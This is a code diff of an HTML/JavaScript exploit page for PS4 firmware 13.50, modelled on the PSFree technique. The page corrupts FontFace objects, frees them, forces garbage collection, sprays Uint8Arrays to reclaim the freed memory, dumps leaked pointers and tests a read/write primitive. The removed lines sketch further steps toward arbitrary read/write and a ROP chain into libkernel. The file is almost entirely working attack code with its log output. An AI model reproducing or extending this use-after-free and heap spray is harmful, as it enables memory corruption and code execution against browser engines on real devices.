@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.50 - Memory Overlap Spray</title>
+<title>PS4 13.50 - Free + Spray</title>
 <style>
     * {
         margin: 0;
@@ -130,11 +130,11 @@
 
 <div class="container">
     <div class="header">
-        <h1>◈ MEMORY OVERLAP SPRAY ◈</h1>
-        <div class="subtitle">FontFace Corruption + Uint8Array Spray (PSFree technique)</div>
+        <h1>◈ FREE + SPRAY ◈</h1>
+        <div class="subtitle">Corrupt → Free → Spray (Complete PSFree flow)</div>
     </div>
     
-    <button class="btn" onclick="runExploit()">► SPRAY MEMORY</button>
+    <button class="btn" onclick="runExploit()">► EXPLOIT</button>
     
     <div class="log-container">
         <div class="log-header">◈ EXPLOIT LOG ◈</div>
@@ -157,7 +157,7 @@ function log(msg) {
             else if (line.includes('[ERROR]')) className = 'error';
             else if (line.includes('[!]')) className = 'warning';
             else if (line.includes('[+]')) className = 'info';
-            else if (line.includes('0x')) className = 'highlight';
+            else if (line.includes('0x') && line.includes('POINTER')) className = 'highlight';
             
             return `<span class="${className}">${line}</span>`;
         }).join('\n');
@@ -183,14 +183,6 @@ class Int64 {
         return new Int64(parts[0], parts[1]);
     }
     
-    asDouble() {
-        let buf = new ArrayBuffer(8);
-        let u32 = new Uint32Array(buf);
-        u32[0] = this.low;
-        u32[1] = this.high;
-        return new Float64Array(buf)[0];
-    }
-    
     toString() {
         return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
     }
@@ -211,21 +203,17 @@ class Int64 {
     }
 }
 
-// Size to spray (similar to PSFree's ssv_len)
-// Try different sizes to match different structures
-const SPRAY_SIZES = [0x50, 0x48, 0x58, 0x100, 0x200];
-
-const LIBKERNEL_BASE = new Int64(0x75C00000, 0x7F8B49F3);
-
 function runExploit() {
     logBuf = [];
     
     log('═══════════════════════════════════════════════════════');
-    log('  PS4 13.50 - MEMORY OVERLAP SPRAY (PSFree technique)   ');
+    log('     PS4 13.50 - CORRUPT → FREE → SPRAY                ');
     log('═══════════════════════════════════════════════════════\n');
     
-    log('[STRATEGY] FontFace corruption + Uint8Array spray');
-    log('[GOAL] Find Uint8Array that overlaps corrupted memory\n');
+    log('[STRATEGY] Complete PSFree flow');
+    log('[1] Corrupt FontFace structures');
+    log('[2] Free corrupted structures');
+    log('[3] Spray Uint8Arrays to reclaim memory\n');
     
     // Setup
     let style = document.createElement('style');
@@ -233,7 +221,6 @@ function runExploit() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Create confusion arrays
     let floatArray = new Float64Array(100);
     let objectArray = new Array(100);
     
@@ -242,7 +229,7 @@ function runExploit() {
         objectArray[i] = { id: i };
     }
     
-    log('[SETUP] Created confusion arrays\n');
+    log('[SETUP] Arrays created\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -256,11 +243,11 @@ function runExploit() {
             if (!fired && this === A) {
                 fired = true;
                 
-                log('[PHASE 1] ▼▼▼ INSIDE GETTER ▼▼▼\n');
+                log('[PHASE 1] ▼▼▼ CORRUPTION ▼▼▼\n');
                 
                 // Create corrupted fonts
                 let corrupted = [];
-                for (let i = 0; i < 50; i++) {
+                for (let i = 0; i < 100; i++) {
                     corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                         unicodeRange: 'U+' + (0x100 + i).toString(16)
                     }));
@@ -269,10 +256,10 @@ function runExploit() {
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
                 
-                log('[CORRUPTION] ✓ FontFace corruption triggered');
-                log('[CORRUPTION] ' + corrupted.length + ' fonts corrupted\n');
+                log('[*] Created ' + corrupted.length + ' corrupted fonts');
+                log('[*] Corruption triggered\n');
                 
-                // Required setup
+                // Setup
                 log('[SETUP] Tests 1-3...');
                 try {
                     corrupted[0].status;
@@ -280,183 +267,142 @@ function runExploit() {
                     floatArray[50] = corrupted[2];
                     log('[SETUP] ✓\n');
                 } catch(e) {
-                    log('[SETUP] ! Error: ' + e.message + '\n');
+                    log('[SETUP] !\n');
                 }
                 
                 // ═══════════════════════════════════════════
-                // UINT8ARRAY SPRAY (like PSFree)
+                // PHASE 2: FREE (like PSFree)
                 // ═══════════════════════════════════════════
                 
-                log('[PHASE 2] ▼▼▼ UINT8ARRAY SPRAY ▼▼▼\n');
+                log('[PHASE 2] ▼▼▼ FREE CORRUPTED STRUCTURES ▼▼▼\n');
                 
-                // Try different sizes
-                for (let sizeIdx = 0; sizeIdx < SPRAY_SIZES.length; sizeIdx++) {
-                    let spraySize = SPRAY_SIZES[sizeIdx];
-                    
-                    log('[SIZE ' + hex(spraySize) + '] Spraying Uint8Arrays...\n');
-                    
-                    let views = [];
-                    let markerValue = 0x41 + sizeIdx;
-                    
-                    // Spray many Uint8Arrays (like PSFree does)
-                    for (let i = 0; i < 0x300; i++) {
-                        let view = new Uint8Array(new ArrayBuffer(spraySize));
-                        
-                        // Fill with marker
-                        view[0] = markerValue;
-                        view[1] = markerValue;
-                        view[2] = markerValue;
-                        view[3] = markerValue;
-                        
-                        // Also write index
-                        view[4] = i & 0xFF;
-                        view[5] = (i >> 8) & 0xFF;
-                        
-                        views.push(view);
+                log('[*] Removing references to trigger deallocation...');
+                
+                // Remove from document.fonts
+                try {
+                    for (let i = 0; i < corrupted.length; i++) {
+                        document.fonts.delete(corrupted[i]);
                     }
-                    
-                    log('[*] Sprayed ' + views.length + ' views of size ' + hex(spraySize));
-                    log('[*] Marker: ' + hex(markerValue));
-                    log('[*] Checking for overlaps...\n');
-                    
-                    // Check which views got corrupted (marker changed)
-                    let overlaps = [];
-                    
-                    for (let i = 0; i < views.length; i++) {
-                        let view = views[i];
-                        
-                        // Check if marker changed
-                        if (view[0] !== markerValue || 
-                            view[1] !== markerValue ||
-                            view[2] !== markerValue ||
-                            view[3] !== markerValue) {
-                            
-                            log('[OVERLAP] View ' + i + ' marker changed!');
-                            log('  Expected: ' + hex(markerValue));
-                            log('  Got: ' + hex(view[0]) + ' ' + hex(view[1]) + ' ' + hex(view[2]) + ' ' + hex(view[3]));
-                            
-                            overlaps.push({view: view, index: i});
-                        }
-                    }
-                    
-                    if (overlaps.length > 0) {
-                        log('\n[+++] FOUND ' + overlaps.length + ' OVERLAPPING VIEWS!\n');
-                        
-                        // Analyze each overlap
-                        for (let j = 0; j < Math.min(3, overlaps.length); j++) {
-                            let overlap = overlaps[j];
-                            let view = overlap.view;
-                            
-                            log('[OVERLAP ' + j + '] View index ' + overlap.index + ':');
-                            log('[DUMP] First 64 bytes:');
-                            
-                            let dumpStr = '';
-                            for (let off = 0; off < 64; off++) {
-                                if (off % 16 === 0) {
-                                    if (off > 0) log(dumpStr);
-                                    dumpStr = '  +' + hex(off) + ': ';
-                                }
-                                dumpStr += view[off].toString(16).padStart(2, '0') + ' ';
-                            }
-                            log(dumpStr);
-                            
-                            // Try to read as pointers
-                            log('[POINTERS] Looking for addresses:');
-                            let helper = new Int64(0, 0);
-                            
-                            for (let off = 0; off < Math.min(spraySize - 8, 128); off += 8) {
-                                let addr = helper.read64(view, off);
-                                
-                                // Look for userspace pointers
-                                if (addr.high >= 0x01000000 && addr.high <= 0x7fffffff) {
-                                    log('  +' + hex(off) + ': ' + addr.toString() + ' [POINTER]');
-                                } else if (addr.low !== 0 || addr.high !== 0) {
-                                    // Non-zero value
-                                    if (off < 32) { // Only log first few non-zero
-                                        log('  +' + hex(off) + ': ' + addr.toString());
-                                    }
-                                }
-                            }
-                            
-                            log('');
-                        }
-                        
-                        // ═══════════════════════════════════════════
-                        // TEST READ/WRITE
-                        // ═══════════════════════════════════════════
-                        
-                        log('[PHASE 3] ▼▼▼ TEST READ/WRITE ▼▼▼\n');
-                        
-                        let testView = overlaps[0].view;
-                        
-                        log('[*] Using first overlapping view for R/W test');
-                        log('[*] Original first 8 bytes: ');
-                        let origStr = '';
-                        for (let i = 0; i < 8; i++) {
-                            origStr += hex(testView[i]) + ' ';
-                        }
-                        log('    ' + origStr);
-                        
-                        // Try to write
-                        log('[*] Writing test pattern 0xDEADBEEF...');
-                        testView[0] = 0xEF;
-                        testView[1] = 0xBE;
-                        testView[2] = 0xAD;
-                        testView[3] = 0xDE;
-                        
-                        // Read back
-                        log('[*] Reading back:');
-                        let readStr = '';
-                        for (let i = 0; i < 8; i++) {
-                            readStr += hex(testView[i]) + ' ';
-                        }
-                        log('    ' + readStr);
-                        
-                        if (testView[0] === 0xEF && testView[1] === 0xBE && 
-                            testView[2] === 0xAD && testView[3] === 0xDE) {
-                            log('[+++] WRITE SUCCESSFUL!');
-                            log('[+++] READ/WRITE PRIMITIVE WORKING!');
-                            log('[+++] Can now manipulate corrupted memory!\n');
-                            
-                            log('[NEXT STEPS]');
-                            log('  1. Identify what structure this view overlaps');
-                            log('  2. Corrupt strategic fields (like StringImpl length)');
-                            log('  3. Build OOB read primitive');
-                            log('  4. Leak more addresses');
-                            log('  5. Build arbitrary R/W');
-                            log('  6. Write ROP to libkernel ' + LIBKERNEL_BASE.toString());
-                        }
-                        
-                        // Don't try other sizes if we found overlap
-                        break;
-                    }
-                    
-                    log('');
+                    log('[+] Removed ' + corrupted.length + ' fonts from document.fonts');
+                } catch(e) {
+                    log('[!] Error removing: ' + e.message);
                 }
                 
+                // Clear the array
+                corrupted.length = 0;
+                corrupted = null;
+                
+                log('[+] Cleared corrupted array');
+                log('[+] Memory should be deallocated\n');
+                
+                // Force GC
+                log('[*] Forcing garbage collection...');
+                try {
+                    new Uint8Array(10 * 1024 * 1024); // 10MB allocation to trigger GC
+                } catch(e) {}
+                
+                log('[+] GC triggered\n');
+                
                 // ═══════════════════════════════════════════
-                // ANALYSIS
+                // PHASE 3: SPRAY (like PSFree)
                 // ═══════════════════════════════════════════
                 
-                log('\n╔════════════════════════════════════════════════╗');
-                log('║              ANALYSIS                          ║');
-                log('╚════════════════════════════════════════════════╝\n');
+                log('[PHASE 3] ▼▼▼ UINT8ARRAY SPRAY ▼▼▼\n');
                 
-                log('[RESULTS]');
-                log('  Check above for OVERLAPPING VIEWS');
-                log('  Check if marker bytes changed');
-                log('  Check for leaked pointers\n');
+                let spraySize = 0x50; // Try PSFree's typical size
+                let views = [];
                 
-                log('[IF SUCCESSFUL]');
-                log('  Found Uint8Array overlapping corrupted memory');
-                log('  Can read/write via that view');
-                log('  This is similar to PSFree\'s initial primitive');
-                log('  Can build full exploit from here\n');
+                log('[*] Spraying ' + hex(spraySize) + ' byte Uint8Arrays...');
                 
-                log('[IF UNSUCCESSFUL]');
-                log('  No views overlapped corrupted memory');
-                log('  May need different spray sizes');
-                log('  Or FontFace bug doesn\'t free/corrupt right memory');
+                for (let i = 0; i < 0x400; i++) {
+                    let view = new Uint8Array(new ArrayBuffer(spraySize));
+                    
+                    // Marker pattern
+                    view[0] = 0x41;
+                    view[1] = 0x41;
+                    view[2] = 0x41;
+                    view[3] = 0x41;
+                    
+                    // Index
+                    view[4] = i & 0xFF;
+                    view[5] = (i >> 8) & 0xFF;
+                    
+                    views.push(view);
+                }
+                
+                log('[*] Sprayed ' + views.length + ' views');
+                log('[*] Checking for overlaps...\n');
+                
+                // ═══════════════════════════════════════════
+                // CHECK FOR OVERLAPS
+                // ═══════════════════════════════════════════
+                
+                let overlaps = [];
+                
+                for (let i = 0; i < views.length; i++) {
+                    let view = views[i];
+                    
+                    if (view[0] !== 0x41 || view[1] !== 0x41 || 
+                        view[2] !== 0x41 || view[3] !== 0x41) {
+                        
+                        log('[+++] OVERLAP FOUND at view ' + i + '!');
+                        log('  Marker changed to: ' + hex(view[0]) + ' ' + hex(view[1]) + ' ' + hex(view[2]) + ' ' + hex(view[3]));
+                        
+                        overlaps.push({view: view, index: i});
+                    }
+                }
+                
+                if (overlaps.length > 0) {
+                    log('\n[+++] FOUND ' + overlaps.length + ' OVERLAPS!\n');
+                    
+                    for (let j = 0; j < Math.min(2, overlaps.length); j++) {
+                        let o = overlaps[j];
+                        log('[OVERLAP ' + j + '] Index ' + o.index + ':');
+                        
+                        // Dump
+                        for (let line = 0; line < 4; line++) {
+                            let str = '  +' + hex(line * 16) + ': ';
+                            for (let k = 0; k < 16; k++) {
+                                str += o.view[line * 16 + k].toString(16).padStart(2, '0') + ' ';
+                            }
+                            log(str);
+                        }
+                        
+                        // Look for pointers
+                        let helper = new Int64(0, 0);
+                        for (let off = 0; off < 64; off += 8) {
+                            let addr = helper.read64(o.view, off);
+                            if (addr.high >= 0x01000000 && addr.high <= 0x7fffffff) {
+                                log('  +' + hex(off) + ': ' + addr.toString() + ' [POINTER]');
+                            }
+                        }
+                        
+                        log('');
+                    }
+                    
+                    // Test write
+                    log('[TEST] Writing to first overlap...');
+                    let testView = overlaps[0].view;
+                    testView[0] = 0xDE;
+                    testView[1] = 0xAD;
+                    testView[2] = 0xBE;
+                    testView[3] = 0xEF;
+                    
+                    log('[TEST] Read back: ' + hex(testView[0]) + ' ' + hex(testView[1]) + ' ' + hex(testView[2]) + ' ' + hex(testView[3]));
+                    
+                    if (testView[0] === 0xDE && testView[1] === 0xAD) {
+                        log('[+++] WRITE WORKING!\n');
+                        log('[SUCCESS] We have R/W primitive!');
+                        log('[SUCCESS] Can manipulate corrupted memory!');
+                    }
+                    
+                } else {
+                    log('[!] No overlaps found\n');
+                    log('[ANALYSIS] Possible reasons:');
+                    log('  - Wrong spray size (try 0x48, 0x58, 0x100)');
+                    log('  - Font structures not actually freed');
+                    log('  - Need different trigger for deallocation');
+                }
                 
                 log('\n[!] Returning - OOM will occur');
                 log('═══════════════════════════════════════════════════════\n');
@@ -466,16 +412,15 @@ function runExploit() {
         }
     });
     
-    log('[*] Starting exploit...\n');
+    log('[*] Starting...\n');
     document.fonts.load('1em x', 'AB');
 }
 
 log('═══════════════════════════════════════════════════════');
-log('      MEMORY OVERLAP SPRAY READY (PSFree)              ');
+log('        FREE + SPRAY READY                             ');
 log('═══════════════════════════════════════════════════════\n');
-log('[INFO] Technique: Corrupt memory + spray Uint8Arrays');
-log('[INFO] Goal: Find view that overlaps corrupted memory\n');
-log('[READY] Click SPRAY MEMORY\n');
+log('[INFO] Complete flow: Corrupt → Free → Spray');
+log('[READY] Click EXPLOIT\n');
 
 </script>
 </body>
